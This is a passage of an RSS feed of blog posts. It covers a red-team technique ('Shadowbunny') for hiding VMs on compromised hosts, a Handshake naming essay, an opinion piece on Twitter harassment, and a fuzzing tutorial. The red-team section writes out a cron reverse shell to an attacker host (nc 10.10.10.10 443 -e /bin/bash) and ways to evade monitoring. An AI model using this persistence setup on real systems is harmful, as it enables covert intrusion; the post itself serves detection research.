<p>When I came back to the office, the team had placed a giant bunny teddy into my chair. In retrospect, it seemed a legitimate replacement for the manager, <em>as hardly anyone seemed to have noticed my absence</em>.</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-transparent.png" alt="The original Shadowbunny"></p>
<p>At that time, I had been contemplating with the idea of using virtual machines for red teaming. Especially for lateral movement it seemed like a great way to try something new that possibly evades detections and at the same time providing a persistence mechanism.</p>
<p>The combination of the ‚Äúshadow manager‚Äù that was put in my chair during vacation as replacement, plus the idea of using virtual machines for lateral movement was the beginning of the Shadowbunny.</p>
<blockquote>
<p>A Shadowbunny is a virtual machine (VM) instance that is deployed by an adversary on a target host to pivot and provide  persistence and at the same time evade detections. <a href="https://www.urbandictionary.com/define.php?term=shadowbunny">¬ª Urban Dictionary ¬´</a></p>
</blockquote>
<p>The VM itself does not have any security monitoring and is entirely attacker controlled.</p>
<h3 id="using-virtual-machines-for-attacks">Using virtual machines for attacks</h3>
<p><strong>Real-world adversaries are using virtual machines as well by the way.</strong> Recently the <a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">Ragnar Locker Ransomware</a> was seen using a virtual machine (VirtualBox) to hide its tracks.</p>
<p>During red team operations I have used the Shadowbunny mostly for measuring long term persistence, but also for unique things such as cryptocurrency mining.</p>
<p><img src="https://embracethered.com/blog/images/2020/persistence-cryptomining.jpg" alt="Shadowbunny in Red Team Operations Examples"></p>
<p>If there is interest, I can chat more about such unique exercises in another post - let me know. Let‚Äôs look on why adversaries use virtual machines.</p>
<h2 id="why-would-adversaries-use-virtual-machines">Why would adversaries use virtual machines?</h2>
<p>There a wide range of reasons for exploring virtual machines during lateral movement:</p>
<ul>
<li><strong>The VM is entirely attacker controlled</strong> - a perfect sandbox for deployment ‚Äúbehind enemy‚Äù lines</li>
<li><strong>Lack of monitoring and security controls inside the VM</strong> ‚Äì there is no anti-virus or detections inside the VM</li>
<li><strong>Persistence</strong> - VMs can be setup to automatically start again in case the host reboots</li>
<li><strong>Obfuscation</strong> - VMs can use disk encryption to make forensic investigations difficult</li>
<li><strong>Backdoor</strong> - Many virtualization products come with features to establish native host connections that might stay undetected (such as Shared Folders for persistent access to files on the host). Or an attacker could wait for new 0-days to re-gain access to the host.</li>
<li>This <strong>attack technique is not well researched but used by real world adversaries</strong>. We need better detection capabilities.</li>
<li>A <strong>Shadowbunny pivot creates a VM on the target to pivot and this might go under the radar</strong></li>
<li>An interesting side effect is that a VM also limits the damage that untrusted code can cause in the environment. For instance, let‚Äôs say you run a public cryptocurrency miner during a red teaming operation. The red team reviews the code, even compiles it themselves and to add additional safety measure one can run the untrusted code in a dedicated, isolated VM.</li>
</ul>
<p>Above points are some of the reasons we will see malware leverage virtual machines more often in the future, which brings us to the reason on starting to discuss these more thoroughly.</p>

<p>The Shadowbunny technique is a post-exploitation scenario. This means that an adversary has compromised a target and has administrative access. There is no vulnerability per se in any information described in this post.</p>
<p>The fact that there is now evidence that adversaries use this technique for ransomware deployment, shows that more light has to be put on understanding how virtual machines can be misused by adversaries.</p>
<p>The goal is to explore what is possible and to improve detections for post-exploitation scenarios.</p>
<p>So, let‚Äôs dive into the technical aspects.</p>

<p>The first question is what virtualization product to choose from? There are a lot of options‚Ä¶. Initially, I used <strong>Hyper-V</strong>, as that ships out of box with Windows and if not present, can be quickly enabled.</p>
<p>This post focusing on <strong>VirtualBox</strong> to help train the blue team and explore these attacks - remember the Ragnar Locker ransomware used VirtualBox. But no worries, we also cover the most important commands for Hyper-V.</p>
<p>Personally, I have not yet used VMWare for this. Although after sharing this information with another red team in the industry, they leveraged VMWare successfully. They ended up manually installing it on a compromised host.</p>
<p>VirtualBox is a great product and it is available for multiple platforms.</p>
<h2 id="direct-host-connections">Direct Host Connections</h2>
<p>One important aspect is that some virtualization products can be configured to have direct host access. What I mean by this is for instance the creation of a <strong>shared folder between guest and host</strong>, depending on the product access can be given without having to authenticate over the network. <strong>This is a backdooring technique to be aware of.</strong></p>
<p>For malware this is ideal because otherwise accessing files on the host would go over a remote connection, which means one has to have valid credentials to authenticate to the host at all times. That can be useful also, but it is not as neat as ‚Äúnative‚Äù host connection using a shared folder. Hyper-V has limitation in this regards with ‚Äúdirect‚Äù guest to host connections.</p>
<p>For certain attacks, a persistent connection (or backdoor) to the host might not be necessary. For instance, imagine an adversary using a VM to mine cryptocurrency or perform offline password brute force attacks. In that case they only need a NAT or bridged LAN connection to reach their C2 infrastructure to share results. There is no need to ever access the host directly after deploying the VM.</p>
<p>For this demonstration and proof of concept, we are targeting a Windows machine (64 bit).</p>
<h2 id="pre-requisites">Pre-requisites</h2>
<p>For the scenario we are walking through there are a few pre-requisites:</p>
<h3 id="command-and-control-infrastructure">Command and Control Infrastructure</h3>
<p>The first step is to setup basic Command &amp; Control infrastructure (C2). Just leverage whatever C2 infrastructure you are using during red team operations. For example, here is a screenshot of Sliver by Bishop Fox setup, accepting incoming zombies (shadowbunnies) connections:</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-c2-prereq.jpg" alt="Shadowbunny Command Center"></p>
<p>However, for this simple demo we just use <code>netcat</code> as server. The attacker‚Äôs server is hosted at <code>10.10.10.10</code>.</p>
<p>We start up our <code>netcat</code> server using:</p>
<pre><code>sudo nc -klvp 443
</code></pre><p>The arguments are as follows:</p>
<ul>
<li><code>-k</code> allows for multiple connections, so that netcat doesn‚Äôt entirely terminate if we exit the shell</li>
<li><code>-l</code> configures netcat as a server</li>
<li><code>-v</code> is the verbose mode, so netcat displays some more information</li>
<li><code>-p</code> specifies the port to listen on, in this case we just use port 443</li>
</ul>
<p>That is it for the demo, the C2 is up and running. The following image shows this simple setup:</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-c2.png" alt="Shadowbunny Command Center"></p>
<p>A host firewall might be blocking connections, in that case the firewall needs adjustments. During red team operation an encrypted channel should be used, possibly using HTTPS traffic on 443 to blend in.</p>
<h3 id="creating-the-shadowbunny-virtual-disk-image">Creating the Shadowbunny virtual disk image</h3>
<p>The second pre-requisite is the Shadowbunny disk image.</p>
<p><strong>The red team can customize the VM to their hearts content, it is fully controlled by the attacker.</strong></p>
<p>The VM will probably want to automatically connect to the C2 periodically to check for commands. Possibly enable disk encryption, uninstall any unneeded software, establish direct connections to host via a shared folder or clipboard access, disabling any AV inside, sink holing telemetry, maybe USB access to have access to smart cards, or security keys and more.</p>
<p>The creation can be a lengthy and involved step depending on the red team operation. For certain scenarios the disk size has to be small to limit the amount of time it takes to perform lateral movement.</p>
<blockquote>
<p>Interesting fact: The recent ‚ÄúRagnar Lock Ransomware‚Äù used an old version of Windows XP ‚Äì which keeps the size of the virtual machine quite small.</p>
</blockquote>
<p>To get started Ubuntu Server VM is a good option. For the more advanced cases there are light-weight Linux distributions to choose from as well. In the end, the outcome will be a virtual machine disk image file (or vdi, vhd, vhdx).</p>
<p><strong>Using flock to regularly connect to the C2:</strong></p>
<p>If the VM runs Linux the <code>flock</code> command can be used to awake zombies regularly.</p>
<ul>
<li>Edit crontab on the attack VM (I like nano):</li>
</ul>
<pre><code>sudo crontab -e
</code></pre><ul>
<li>Afterward, updating the cron file:</li>
</ul>
<pre><code>* * * * * /usr/bin/flock -n /tmp/zombie.lock nc 10.10.10.10 443 -e /bin/bash
</code></pre><p><strong>Explanation:</strong>
The <code>flock</code> command is an elegant solution to ensure the command is only running once. The <code>-n</code> option means that if the lock file at <code>/tmp/zombie.lock</code> exists, then the process will stop. If it is not yet created, then the <code>netcat</code> command will be run and connect to the server.</p>
<p>Cron jobs and <code>flock</code> come in handy for other scenarios also.</p>
<h3 id="optional-shared-folders-and-other-advanced-features">Optional: Shared Folders and other advanced features</h3>
<p>To support shared folders or access the hosts clipboard, the ‚ÄúGuest Additions‚Äù must be installed in the VM. More information, and options on how to install can be found on Ubuntu and VirtualBox websites.</p>
<p>In this case I downloaded the ISO file directly into the VM using the following command.</p>
<pre><code>wget https://download.virtualbox.org/virtualbox/6.1.8/VBoxGuestAdditions_6.1.8.iso`
</code></pre><p>And then installed it using the following commands:</p>
<pre><code>sudo mkdir /mnt/cd
sudo mount VBoxGuestAdditions_6.1.8.iso /mnt/cd
sudo ./VBoxLinuxAdditions.run -‚Äìnox11
</code></pre><p>That‚Äôs it, the VirtualBox <strong>Guest Additions</strong> are now installed in the VM.</p>
<p>At times this step needs debugging, as the installation of the Guest Additions can be done in a variety of ways and depends on what operating system that is being used. The VirtualBox manual has more details.</p>
<p>Having those pre-requisites setup, we are ready to perform a <strong>Shadowbunny pivot</strong> using this virtual machine image.</p>

<p>Now that client and server are ready, they can be used during lateral movement.</p>
<p><a href="https://embracethered.com/blog/images/2020/shadowbunny-overview.jpg"><img src="https://embracethered.com/blog/images/2020/shadowbunny-overview.jpg" alt="Shadowbunny Overview"></a></p>
<p>The steps involved the pivot, installation/enabling of virtualization software, downloading of the pre-created disk images, configuration and launch. Let us look at this in more detail.</p>
<h2 id="compromise---pivoting-to-the-target">Compro‚Ä¶</h2></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/</a></em></p>]]>
            </description>
            <link>https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579384</guid>
            <pubDate>Thu, 24 Sep 2020 15:16:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Handshake ‚Äì A Namespace for the Decentralized Web]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24579284">thread link</a>) | @rasengan
<br/>
September 24, 2020 | https://meowis.ms/handshake.html | <a href="https://web.archive.org/web/*/https://meowis.ms/handshake.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a href="https://meowis.ms/"> &lt; </a>




<!-- <div class="subtitle"></div> -->

<p>Names are fundamental to human existence and how we relate to everything in the world. At the heart of all interactions lies the ability for all the parties to match names to the respective entities they stand for.</p>

<p>Names are so integral to the human experience that a strong argument can be made that if <em>something doesn√¢‚Ç¨‚Ñ¢t have a name, it does not exist.</em></p>

<p>Correspondingly, names on the internet are critical to our online existence. Users, apps, or machines locate a resource on the internet via its name. The name needs to not only be understood by humans but also needs to be uniquely identifiable by machines amongst the billions of potential destinations.</p>

<p>Given that the act of matching a name to the eventual resource is the starting point of trillions of internet transactions that happen daily,  it is no surprise that out of the three core layers of internet stack - naming (DNS), transportation (TCP/IP) and application (HTTP), naming is at the very start of the stack.</p>

<p>Naming needs a single source of truth as the names within the namespaces have to be unique across the whole system. Hence, an effective naming system cannot merely be a standard or a protocol, it has to meet all the other aspects of running an internet-scale namespace - including enforcement of unique names, the management of the naming records, scaling to internet traffic, while remaining fully accessible to anyone, anywhere.</p>

<h2 id="namespaces">Namespaces</h2>

<p>Names are the most valuable assets on the internet, but we don√¢‚Ç¨‚Ñ¢t own our own names. All of the crucial namespaces belong to centralized entities who control the namespaces and take that control away from you. This is true for all significant namespaces today - the ICANN namespace, Facebook, Twitter, and Google.</p>

<p>As a result, your name on the internet does not belong to you, but rather to the owners of these centralized namespaces.  With a stroke of the keyboard, they can remove anyone from existence.  If your name lives on a centralized namespace, your right to exist effectively belongs to someone else.</p>

<p>Centralized namespaces also determine much more than a user√¢‚Ç¨‚Ñ¢s ability to exist. They also decree a user√¢‚Ç¨‚Ñ¢s ability to search, match, and communicate with others. They unilaterally set the framework for what protocols can be used, which use cases are permitted, and what information can flow.</p>

<p>The power to enforce monopolies with little consequence also makes these centralized namespaces some of the most valuable properties on the internet today. Verisign makes billions a year controlling .com with practically zero innovation, while ICANN has the power to arbitrarily raise price caps of entire TLDs with their pet cartel companies. Facebook and Twitter controls exactly how users can use their names/accounts, and can heedlessly cancel pages and remove identities for barely specified reasons.</p>

<p>Everywhere we see, we are seeing the serious dangers of depending on centralized entities to exist and be found by others. The Internet is supposed to be kingless, but the ability to strike away one√¢‚Ç¨‚Ñ¢s existence and control exactly how the name is to be used makes the owners of these namespaces the de-facto kings/governors of the internet.</p>

<h2 id="the-world-needs-a-decentralized-namespace">The World Needs a Decentralized Namespace</h2>

<p>Of course, the ability of these centralized namespace owners to control digital existence, lockout access, and enforce monopolistic economics is the complete opposite goal of the decentralized web, which is the ability to exist, innovate, and create their own business models without the need for centralized control or systems.</p>

<p>Whether it√¢‚Ç¨‚Ñ¢s decentralized currencies, decentralized file systems, or decentralized servers - if these decentralized entities do not live on a widely used namespace, they simply do not exist to the vast majority of users on the internet.</p>

<p><em>Without a decentralized namespace widely readable by humans and resolvable by machines, it is impossible for the decentralized world to be widely adopted by users</em>.</p>

<p><strong>Criteria for a Decentralized Naming System</strong></p>

<p>Naming systems play a crucial role in discovery, connection and identification. As one of the most fundamental and long-lasting components of the internet backbone infrastructure, the bar needs to be set very high in terms of longevity, stability, and technical scalability.</p>

<p>For a decentralized naming system to become the legitimate namespace for the decentralized world, the bar is even higher. Without a centralized body in charge, the world has to trust that this naming system will exist in a stable state for a long time to come and stay relevant regardless of potential upheavals and technological progress.</p>

<p>As such, this naming system√¢‚Ç¨‚Ñ¢s fundamental construction needs to have certain key technical, social, and governance requirements:</p>

<ol>
  <li><strong>Be truly decentralized</strong>: what is the point of a decentralized naming system if it remains controlled by a small set of people?</li>
  <li><strong>Main key focus as a naming system</strong>: naming systems need to be extremely focused and fast. Can you imagine the DNS system operating reliably if it was also designed for delivering 4K video?</li>
  <li><strong>Be as accessible yet trustless as possible</strong>: anyone should be able to access the namespace directly in a fully trustless manner without intensive resources</li>
  <li><strong>Compatible with the rest of the internet</strong>: allowing for seamless usage with the rest of the application, user, and technical stack</li>
  <li><strong>Stability and upgradability at the protocol level</strong>: allowing for innovation moving forward without disrupting regular operations</li>
</ol>

<h2 id="handshake-design">Handshake Design</h2>

<p>Given these objectives, and with the general goal of the decentralized root zone and certificate authority, Handshake is the only naming system that is fundamentally suitable to be the namespace for decentralized web.</p>

<h3 id="1-focus-as-a-naming-system">1. Focus as a Naming System</h3>

<p>Let√¢‚Ç¨‚Ñ¢s consider the inherent complexity of an internet-scale naming system. For reference, the naming layer (DNS), unlike the other layers of the internet stack, is the only layer that is a system and not a protocol - the key difference between the two is that a protocol cannot enforce uniqueness of names, which is essential to a functioning namespace. It√¢‚Ç¨‚Ñ¢s also arguably by far the most complex layer with many competing technical, political, and economical demands.</p>

<p>As a standalone blockchain, Handshake has room to grow all on its own and govern itself without interfering with other projects or having to compete with different priorities with other use cases (like gaming or DeFi) trying to run in parallel on the same network. In addition, there are several fundamental constraints in other blockchains - for example, Bitcoin limited OP sizes and Ethereum√¢‚Ç¨‚Ñ¢s notoriously hard to sync blockchain.</p>

<p>If Handshake is built on another blockchain, the instability caused by these competing priorities for use cases and political interests also eliminates one of the core requirements for a decentralized naming infrastructure - which is stability. A naming infrastructure needs to be highly stable - remember - both users, hosts and developers need to be confident that the names will be around for a long time in the same format. For instance, Ethereum√¢‚Ç¨‚Ñ¢s sky high gas prices due to DeFi and the complex migration to ETH2 are both creating high levels of certainty around how apps will work in the future, and whether retail users will be able to have the same level of access as large ticket users.</p>

<p>Lastly, creating a native auction system is complicated and requires highly specific primitives, such as making coins unspendable for certain periods, and increases the complexity of the system if HNS is a non-native token.</p>

<h3 id="2-decentralization">2. Decentralization</h3>

<p>The other critical consideration is decentralization. <em>Remember, the goal here is to achieve a truly decentralized, uncensorable namespace independent of centralized control and policies. Anything less than will be completely redundant.</em></p>

<p>Ethereum is the most decentralized smart contract platform of date, but it√¢‚Ç¨‚Ñ¢s still insufficient as a base layer blockchain for a truly decentralized naming system. A system based on Ethereum either would have to be strictly immutable or engineer a governance mechanism with a single or multiple signers. For example, the ENS system on Ethereum has a 7-part multisig making it either censorable and shutting it off to any future innovations or upgrades. These mechanisms either risk shutting off future innovations or don√¢‚Ç¨‚Ñ¢t meet the decentralized requirement.</p>

<p>How about sidechains? Sidechains mostly rely on the main chain√¢‚Ç¨‚Ñ¢s security, which makes them completely subject to the same concerns above in terms of sharing priorities with the main chain. In addition, there is currently no such thing as a decentralized side-chain on Bitcoin. Counterparty is a one-way system, Liquid requires a small federated multisig, and Rootstock is currently federated waiting on Drivechain support from Bitcoin.</p>

<p>For all of PoW√¢‚Ç¨‚Ñ¢s issues, namely with the limited number of miners, it is built on competition which is inherently decentralized as well as clear separation of concerns between developers, users, and miners. This is in contrast to PoS which encourages stakeholders to collude and centralize, creating a largely plutocratic environment.</p>

<p>As such, true naming decentralization with the ability to upgrade is likely best achieved on a standalone PoW chain with robust hash power, a strong ecosystem, and miner confidence in the value of the blockchain.</p>

<h3 id="3-ease-of-trustless-resolution">3. Ease of Trustless Resolution</h3>

<p>Compared to other naming blockchains, _the entire Handshake stack is engineered for the use case of creating a human readable, truly decentralized, fully accessible and secure namespace. _</p>

<p>The naming data in Handshake is stored in a novel data structure called an Urkel Tree,  which was designed specifically for this purpose. The proofs are small and verify quickly, allowing name resolution to happen with very little computation.</p>

<p>Secondly, a highly unique application called HNSD written in C only handles the DNS functions of Handshake (avoiding ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://meowis.ms/handshake.html">https://meowis.ms/handshake.html</a></em></p>]]>
            </description>
            <link>https://meowis.ms/handshake.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579284</guid>
            <pubDate>Thu, 24 Sep 2020 15:05:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Twitter mob is good for business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579258">thread link</a>) | @Reedx
<br/>
September 24, 2020 | https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business | <a href="https://web.archive.org/web/*/https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After Ruth Bader Ginsburg died, Reza Aslan, the famous broadcast commentator and scholar of religion, published a tweet <a href="https://twitter.com/rezaaslan/status/1307107507131875330" target="_blank">which read</a>, ‚ÄúIf they even TRY to replace RBG we burn the entire fucking thing down.‚Äù<br></p><p>This was stupid, but it was also savvy.<br></p><p>Before I explain, a bit of disclosure: I have no beef with Aslan, <a href="https://www.thecut.com/2014/10/reza-aslan-on-what-the-new-atheists-get-wrong.html" target="_blank">published an enjoyable interview with him in 2014</a>, and <a href="https://twitter.com/jessesingal/status/873752684456706048" target="_blank">thought</a> (and continue to think) he got a raw deal when CNN let him go for <a href="https://money.cnn.com/2017/06/09/media/cnn-reza-aslan-decision/index.html">‚Äúprofane anti-Trump tweets.‚Äù</a><br></p><p>But Aslan‚Äôs tweet and its aftermath highlight a pretty ridiculous reality of online life these days, which is that big names on Twitter and other platforms regularly seek out harassment in the most obvious ways, and then, when said harassment (inevitably) arrives, attempt to leverage it to boost their brand and gain attention.</p><p>Aslan‚Äôs tweet was met with fury, because of course it was ‚Äî it sounded like he was saying liberals should burn down the entire country over the RBG seat. Aslan was firehosed with a bunch of negative reactions on Twitter and elsewhere, and eventually that fury led to an article in <em>American Greatness</em>, a right-wing outlet, headlined <a href="https://amgreatness.com/2020/09/20/the-loathsomeness-of-reza-aslan/" target="_blank">‚ÄúThe Loathsomeness of Reza Aslan,‚Äù</a> as well as a Breitbart story whose headline contained the overheated claim that Aslan‚Äôs tweet constituted a <a href="https://www.breitbart.com/2020-election/2020/09/18/blue-checks-vow-violence-if-mcconnell-tries-to-replace-ruth-bader-ginsburg-burn-the-entire-fking-thing-down/" target="_blank">‚Äúvow [of] violence.‚Äù</a></p></div><div><p>Aslan, of course, replied with a <a href="https://twitter.com/rezaaslan/status/1308165311330304000" target="_blank">tweet linking to the American Greatness story</a> that read, ‚ÄúI love this, especially when I think about the fact that Trump‚Äôs followers have been encouraged by him to literally murder people. But yeah, Ok.‚Äù Earlier that day, he also <a href="https://twitter.com/rezaaslan/status/1308056797110915073" target="_blank">tweeted</a>, ‚ÄúBeen a few days since I tweeted that if GOP try to jam a SCOTUS thru B4 election we burn the fucking thing down &amp; since the death threats &amp; Breitbart headlines about my tweet have now stopped let me just say that if GOP try to jam SCOTUS through we burn the fucking thing down.‚Äù</p><p>To anyone who understands how the internet works, it shouldn‚Äôt come as a surprise that Aslan received death threats and, in all likelihood, all sorts of other abuse. This is horrific behavior, and anyone who sends a death threat to anyone should get a visit from the cops.</p><p>But it is also clear that Aslan is doing everything in his power to keep the online conflagration burning ‚Äî he is quite directly feeding it fuel. This is a behavior I‚Äôve noticed over and over among certain types on Twitter, who complain about harassment even as they do seemingly everything to maximize the probability of antagonizing as many people as possible, leading to yet more harassment.</p><p>For some people, this is chronic behavior that almost comes across as an addiction. I‚Äôm not trying to start fights, so I‚Äôll leave names out of this, but there are certain feminist writers who will tweet, endlessly and obsessively, about the supposed evils of ‚ÄúBernieBros.‚Äù Just over and over and over, long after the point has been made repeatedly. Bernie Twitter, like every other subculture, does have a subset of unhinged people who are unable to resist rising to bait ‚Äî plus, there are always trollish third parties like 4chan who seek out internet drama to stoke ‚Äî so inevitably, if someone talks smack about Sanders over and over and over, they will be the targetof harassment. That harassment, in turn, proves just how evil Bernie supporters are. And on and on the cycle goes, making everyone dumber and more cynical.</p><p>All this stuff is very performative, very geared toward online brand-boosting, and makes it harder to take online harassment ‚Äî which in its <a href="https://nymag.com/intelligencer/2015/09/victim-of-a-scary-web-shaming-speaks-out.html" target="_blank">most serious forms really can be terrifying </a>‚Äî seriously. Being the victim of online harassment absolutely confers status and attention. That doesn‚Äôt mean anyone <em>deserves </em>it, of course, or that it‚Äôs fun to have death threats in your inbox.&nbsp;</p><p>But it does feel like there‚Äôs a willful inability to understand that if you yell out provocative stuff in a public space over and over, and do everything you can to draw attention to yourself and your controversial views in insulting ways, there‚Äôs very little that anyone can do to prevent a small (proportionally speaking) subset of people from responding with disproportionate ire ‚Äî sometimes of the abusive variety.<br></p></div></div>]]>
            </description>
            <link>https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579258</guid>
            <pubDate>Thu, 24 Sep 2020 15:02:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to integrate a fuzzer with your project?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579207">thread link</a>) | @fcambus
<br/>
September 24, 2020 | https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Generally, during fuzz testing (regardless of the tool used to perform it:
American Fuzzy Lop, libFuzzer, or any other), we have to remember
to keep the number of iterations per second high.
This means that a good fuzzer is a fast fuzzer.</p>

<p>This is mostly facilitated by minimizing the structures and operations
needed to prepare the context. We do not reinitialize the mechanisms
of the fuzzed library for every iteration. We use the stack instead of the heap
and globals.
For example, according to
<a href="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Modern_Fuzzing_of_C_CPP_Projects.pdf">Max Moroz‚Äôs fuzzing tutorial</a>,
slide 62, handling 1 MB of
memory on the heap slows down the fuzzer two times, compared to a buffer
of the same size on the stack. A second example from the same tutorial
is the use of <code>memset(3)</code>
function for buffers on the heap that causes the fuzzer performance degradation
up to five times.
Reducing the size of buffers used temporarily is also worth considering.
Allocating a 256 kB buffer on the stack takes three times less time
compared to a 1 MB allocation.
The last ‚Äútrick‚Äù is to use global variables instead of local. The observed
efficiency gain from using this method is about two times.
Our experience shows that this is paid for with a slightly higher memory usage
at the start.</p>

<p>On the other hand, it is essential to remember to
release all the resources used during a fuzzer iteration - this ensures
that the tested program does not consume all the system memory.</p>

<p>Tuning the fuzzer usually gives measurable effects, but under certain
circumstances we will hit a performance barrier. Despite following the best
practices, we will not achieve a significant improvement of the iteration
rate. This is especially true for parsers of binary formats such as executables
or multimedia files. Fast fuzzing targets include regular expression engines,
network stacks, and text formats.</p>



<p>Both AFL++ and libFuzzer use SanitizerCoverage as the default code coverage
testing tool. A built-in LLVM tool can be used to generate reports telling us
what part of the code is being reached by our test corpora.</p>

<p>We are going to show how to work with SanitizerCoverage,
libFuzzer and the <a href="https://github.com/VirusTotal/yara">Yara project</a> example.
Yara is a tool used by malware researchers
and helps to detect and analyse malicious code. Yara is designed around
textual and binary patterns and integrates well with the libFuzzer project.</p>

<p>In order to instrument Yara with necessary code coverage, perform the following
steps:</p>

<pre><code>git clone https://github.com/Moritz-Systems/libfuzzer-coverage-yara
cd libfuzzer-coverage-yara/yara-codecov

./bootstrap.sh

CC=clang CXX=clang++ \
  CFLAGS="-g -O1 -fsanitize=fuzzer-no-link -fprofile-instr-generate \
  -fcoverage-mapping" \
  ./configure

CC=clang CXX=clang++ \
  CFLAGS="-g -O1 -fsanitize=address,fuzzer-no-link \
  -fprofile-instr-generate -fcoverage-mapping" \
  make -j4

libtool --mode=compile --tag=CXX clang++ \
  -fsanitize=address,fuzzer -fprofile-instr-generate \
  -fcoverage-mapping -std=c++11 -I./libyara/include/ \
  -pthread -o yara_rules_lfuzzer_cov.o -c \
  tests/oss-fuzz/rules_fuzzer.cc

libtool --mode=link --tag=CXX clang++ \
  -fsanitize=address,fuzzer -fprofile-instr-generate \
  -fcoverage-mapping \
  -lcrypto -lssl -pthread \
  yara_rules_lfuzzer_cov.o libyara/libyara.la \
  -o yara_rules_lfuzzer_cov
</code></pre>

<p>We have to run the fuzzer together with additional switches and variables:</p>

<pre><code>LLVM_PROFILE_FILE="yara.profraw" \
  libtool --mode=execute \
  ./yara_rules_lfuzzer_cov -runs=1 ../yara-fuzzing-corpus
INFO: Seed: 3494707497
INFO: Loaded 2 modules   (10070 inline 8-bit counters): 10063 [0x7f3b18be361f, 0x7f3b18be5d6e), 7 [0x5ad045, 0x5ad04c),
INFO: Loaded 2 PC tables (10070 PCs): 10063 [0x7f3b18be5d70,0x7f3b18c0d260), 7 [0x56f4b0,0x56f520),
INFO:     1115 files found in ../yara-fuzzing-corpus/
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 19232 bytes
INFO: seed corpus: files: 1115 min: 4b max: 19232b total: 1797733b rss: 36Mb
#1024   pulse  cov: 2719 ft: 10489 corp: 735/695Kb exec/s: 341 rss: 264Mb
#1117   INITED cov: 2738 ft: 10987 corp: 781/1017Kb exec/s: 372 rss: 264Mb
#1117   DONE   cov: 2738 ft: 10987 corp: 781/1017Kb lim: 19232 exec/s: 372 rss: 264Mb
Done 1117 runs in 3 second(s)
</code></pre>

<p>The result is a file with the .profraw extension, which must be indexed before
generating coverage report with the command:</p>

<pre><code>llvm-profdata merge -sparse yara.profraw -o yara.profdata
</code></pre>

<p>The result of the last operation is a file that can be passed to the
SanitizerCoverage report generator (of course you can debug your
harness with coverage!):</p>

<pre><code>llvm-cov show ./yara_rules_lfuzzer_cov.o -instr-profile=yara.profdata
&lt;snipped&gt;                                                  
   30|       |#include &lt;stdint.h&gt;
   31|       |#include &lt;stddef.h&gt;
   32|       |#include &lt;string.h&gt;
   33|       |
   34|       |#include &lt;yara.h&gt;
   35|       |
   36|       |
   37|       |extern "C" int LLVMFuzzerInitialize(int* argc, char*** argv)
   38|      1|{
   39|      1|   yr_initialize();
   40|      1|  return 0;
   41|      1|}
   42|       |
   43|       |
   44|       |extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
   45|  1.11k|{
   46|  1.11k|  YR_RULES* rules;
   47|  1.11k|  YR_COMPILER* compiler;
   48|  1.11k|
   49|  1.11k|  char* buffer = (char*) malloc(size + 1);
   50|  1.11k|
   51|  1.11k|  if (!buffer)
   52|      0|    return 0;
   53|  1.11k|
   54|  1.11k|  strncpy(buffer, (const char *) data, size);
   55|  1.11k|  buffer[size] = 0;
   56|  1.11k|
   57|  1.11k|  if (yr_compiler_create(&amp;compiler) != ERROR_SUCCESS)
   58|  1.11k|  {
   59|      0|    free(buffer);
   60|      0|    return 0;
   61|      0|  }
   62|  1.11k|
   63|  1.11k|  if (yr_compiler_add_string(compiler, (const char*) buffer, NULL) == 0)
   64|    119|  {
   65|    119|    if (yr_compiler_get_rules(compiler, &amp;rules) == ERROR_SUCCESS)
   66|    119|      yr_rules_destroy(rules);
   67|    119|  }
   68|  1.11k|
   69|  1.11k|  yr_compiler_destroy(compiler);
   70|  1.11k|  free(buffer);
   71|  1.11k|
   72|  1.11k|  return 0;
   73|  1.11k|}
</code></pre>

<p>The amount of executions of the specified functions in our harness for the prepared corpora.</p>

<p>Additionally, you can print a summary of coverage data for modules or for individual files:</p>

<pre><code>llvm-cov report ./libyara/hex_grammar.o -instr-profile=foo.profdata
Filename                      Regions    Missed Regions     Cover   Functions  Missed Functions  Executed       Lines      Missed Lines     Cover
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
hex_grammar.c                     489               120    75.46%           4                 0   100.00%         961               165    82.83%
 
Files which contain no functions:
include/yara/hex_lexer.h            0                 0         -           0                 0         -           0                 0         -
include/yara/limits.h               0                 0         -           0                 0         -           0                 0         -
include/yara/re.h                   0                 0         -           0                 0         -           0                 0         -
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
TOTAL                             489               120    75.46%           4                 0   100.00%         961               165    82.83%
</code></pre>



<p>It is worth mentioning that many open-source projects have a variety of test
corpora, sometimes even including file formats no longer in broad use.
Additionally, unit tests provide a very good source of test cases. After
